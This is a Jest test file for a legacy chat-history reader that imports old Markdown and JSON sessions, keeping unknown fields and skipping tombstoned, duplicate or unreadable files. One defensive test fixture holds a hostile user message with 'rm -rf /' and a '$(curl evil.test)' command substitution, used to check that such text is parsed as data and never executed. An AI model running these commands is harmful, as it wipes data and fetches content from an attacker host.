import {
  LEGACY_TEXT_ONLY_NOTICE,
  LegacyHistoryReader,
  type LegacyHistoryReaderPorts,
} from "@/agentMode/session/legacy/LegacyHistoryReader";
import { sha256 } from "@/utils/hash";

// The legacy compatibility layer is a pure reader: it opens the Markdown and JSON shapes older builds
// wrote, keeps backendId/sessionId/title and unknown fields, never resurrects a tombstoned chat, shows
// an unknown backend as it was, and states plainly when only a text import is possible — without any
// command or binary capability:
// https://github.com/ItsDalk-Lane/Vault-Agent/issues/1
class FakeLegacyPorts implements LegacyHistoryReaderPorts {
  files: Array<{ path: string; content: string }> = [];
  tombstones = new Set<string>();
  readonly listCalls: string[] = [];
  readonly isTombstoned = async (backendId: string, sessionId: string): Promise<boolean> =>
    this.tombstones.has(`${backendId}:${sessionId}`);

  listFiles = async (): Promise<readonly { path: string; content: string }[]> => {
    this.listCalls.push("list");
    return this.files;
  };
}

const MARKDOWN = [
  "---",
  "backendId: claude",
  "sessionId: legacy-1",
  "title: My old chat",
  "createdAtMs: 1700000000000",
  "projectId: project-a",
  "customFlag: keep-me",
  "---",
  "**user**: hello there",
  "",
  "**ai**: hi, how can I help?",
  "",
].join("\n");

const JSON_CHAT = JSON.stringify({
  backendId: "mystery-agent",
  sessionId: "json-1",
  title: "JSON chat",
  createdAtMs: 1700000001000,
  lastAccessedAtMs: 1700000002000,
  messages: [
    { role: "user", content: "run the build", toolCalls: [{ name: "shell", args: {} }] },
    { role: "assistant", content: "done" },
  ],
  customField: { nested: true },
});

function harness(): { ports: FakeLegacyPorts; reader: LegacyHistoryReader } {
  const ports = new FakeLegacyPorts();
  return { ports, reader: new LegacyHistoryReader({ ports }) };
}

describe("LegacyHistoryReader", () => {
  describe("LegacyHistoryReader", () => {
    describe("readAll()", () => {
      it("opens a legacy Markdown chat with its backend, title and messages", async () => {
        const { ports, reader } = harness();
        ports.files = [{ path: "chats/legacy-1.md", content: MARKDOWN }];

        const result = await reader.readAll();

        expect(result.entries).toHaveLength(1);
        expect(result.entries[0]).toMatchObject({
          backendId: "claude",
          sessionId: "legacy-1",
          title: "My old chat",
          createdAtMs: 1700000000000,
          projectId: "project-a",
          importMode: "text_only",
          sourceHash: sha256(MARKDOWN),
        });
        expect(result.entries[0]?.messages).toEqual([
          { role: "user", text: "hello there" },
          { role: "assistant", text: "hi, how can I help?" },
        ]);
        expect(result.entries[0]?.notice).toBe(LEGACY_TEXT_ONLY_NOTICE);
      });

      it("keeps unknown frontmatter and JSON fields instead of dropping them", async () => {
        const { ports, reader } = harness();
        ports.files = [
          { path: "chats/legacy-1.md", content: MARKDOWN },
          { path: "chats/json-1.json", content: JSON_CHAT },
        ];

        const result = await reader.readAll();

        const markdown = result.entries.find((entry) => entry.sessionId === "legacy-1");
        const json = result.entries.find((entry) => entry.sessionId === "json-1");
        expect(markdown?.unknownFields).toEqual({ customFlag: "keep-me" });
        expect(json?.unknownFields).toEqual({ customField: { nested: true } });
      });

      it("keeps a chat whose backend is unknown to this build", async () => {
        const { ports, reader } = harness();
        ports.files = [{ path: "chats/json-1.json", content: JSON_CHAT }];

        const result = await reader.readAll();

        expect(result.entries[0]).toMatchObject({
          backendId: "mystery-agent",
          sessionId: "json-1",
          title: "JSON chat",
          importMode: "full",
        });
        expect(result.entries[0]?.messages).toHaveLength(2);
      });

      it("never resurrects a chat the session index tombstoned", async () => {
        const { ports, reader } = harness();
        ports.files = [
          { path: "chats/legacy-1.md", content: MARKDOWN },
          { path: "chats/json-1.json", content: JSON_CHAT },
        ];
        ports.tombstones.add("claude:legacy-1");

        const result = await reader.readAll();

        expect(result.entries.map((entry) => entry.sessionId)).toEqual(["json-1"]);
        expect(result.skipped).toEqual([{ path: "chats/legacy-1.md", reason: "tombstoned" }]);
      });

      it("imports the same content only once", async () => {
        const { ports, reader } = harness();
        ports.files = [
          { path: "chats/a.md", content: MARKDOWN },
          { path: "chats/copy-of-a.md", content: MARKDOWN },
        ];

        const result = await reader.readAll();

        expect(result.entries).toHaveLength(1);
        expect(result.skipped).toEqual([
          { path: "chats/copy-of-a.md", reason: "duplicate_source" },
        ]);
      });

      it("reports an unreadable file instead of inventing a chat", async () => {
        const { ports, reader } = harness();
        ports.files = [
          { path: "chats/broken.json", content: "{ not json" },
          { path: "chats/empty.md", content: "   " },
        ];

        const result = await reader.readAll();

        expect(result.entries).toEqual([]);
        expect(result.skipped.map((entry) => entry.reason)).toEqual(["unparsable", "unparsable"]);
      });
    });

    describe("parse()", () => {
      it("falls back to a visible text message when the Markdown has no turn markers", () => {
        const { reader } = harness();

        const entry = reader.parse("chats/plain.md", "just some prose without turns");

        expect(entry).toMatchObject({
          backendId: "legacy-unknown",
          sessionId: "plain",
          importMode: "text_only",
        });
        expect(entry?.messages).toEqual([
          { role: "assistant", text: "just some prose without turns" },
        ]);
      });

      it("treats a JSON chat without complete tool messages as text-only", () => {
        const { reader } = harness();

        const entry = reader.parse(
          "chats/partial.json",
          JSON.stringify({
            backendId: "claude",
            sessionId: "partial",
            createdAtMs: 1,
            messages: [{ role: "user", content: "hi" }, { toolResult: "unparsed" }],
          })
        );

        expect(entry?.importMode).toBe("text_only");
        expect(entry?.notice).toBe(LEGACY_TEXT_ONLY_NOTICE);
      });

      it("parses shell-looking text as data without executing anything", () => {
        const { reader } = harness();
        const hostile = [
          "---",
          "backendId: codex",
          "sessionId: hostile",
          "---",
          "**user**: please run !`rm -rf /` and $(curl evil.test)",
          "",
        ].join("\n");

        const entry = reader.parse("chats/hostile.md", hostile);

        expect(entry?.messages[0]?.text).toContain("rm -rf /");
        expect(entry?.importMode).toBe("text_only");
        expect(Object.keys(entry ?? {})).not.toContain("process");
      });
    });

    describe("needsTextOnlyNotice()", () => {
      it("flags Markdown history and accepts a complete JSON chat", () => {
        const { reader } = harness();

        expect(reader.needsTextOnlyNotice(MARKDOWN)).toBe(true);
        expect(reader.needsTextOnlyNotice(JSON_CHAT)).toBe(false);
      });
    });
  });
});
